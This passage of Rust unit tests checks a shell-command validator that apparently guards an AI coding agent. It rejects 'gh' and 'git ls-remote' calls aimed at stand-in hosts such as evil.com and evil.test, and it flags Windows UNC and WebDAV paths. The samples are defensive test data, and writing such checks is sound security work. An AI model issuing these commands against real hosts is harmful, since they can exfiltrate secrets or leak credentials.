            &words(&["gh", "pr", "view", "1", "--repo=evil.com/SECRET/x"]),
            true,
        );
        let safe_gh = validate_shared_command(
            "",
            &words(&["gh", "pr", "view", "1", "--repo", "owner/repo"]),
            true,
        );
        if cfg!(feature = "anthropic_internal") {
            assert_eq!(unsafe_gh, Some(false));
            assert_eq!(safe_gh, Some(true));
        } else {
            assert_eq!(unsafe_gh, None);
            assert_eq!(safe_gh, None);
        }
    }

    #[test]
    fn unc_detection_matches_windows_only_mixed_separator_and_url_rules() {
        for value in [
            r"\\server\share",
            "//server/share",
            r"/\\server\share",
            r"\\/server/share",
            r"\\server@SSL@8443\path",
            r"\\server\DavWWWRoot\path",
            r"\\[2001:db8::1]\share",
        ] {
            assert!(
                contains_vulnerable_unc_path_for_platform(value, true),
                "{value:?}"
            );
            assert!(!contains_vulnerable_unc_path_for_platform(value, false));
        }
        for value in ["https://example.com/path", "http://host", r"\single", "//"] {
            assert!(
                !contains_vulnerable_unc_path_for_platform(value, true),
                "{value:?}"
            );
        }
    }

    #[test]
    fn git_ls_remote_rejects_network_destinations_but_accepts_named_remotes() {
        assert_eq!(
            validate_shared_command("", &words(&["git", "ls-remote", "origin"]), false),
            Some(true)
        );
        for target in ["https://evil.test/repo", "git@host:repo", "host:repo"] {
            assert_eq!(
                validate_shared_command("", &words(&["git", "ls-remote", target]), false),
                Some(false)
            );
        }
    }
}
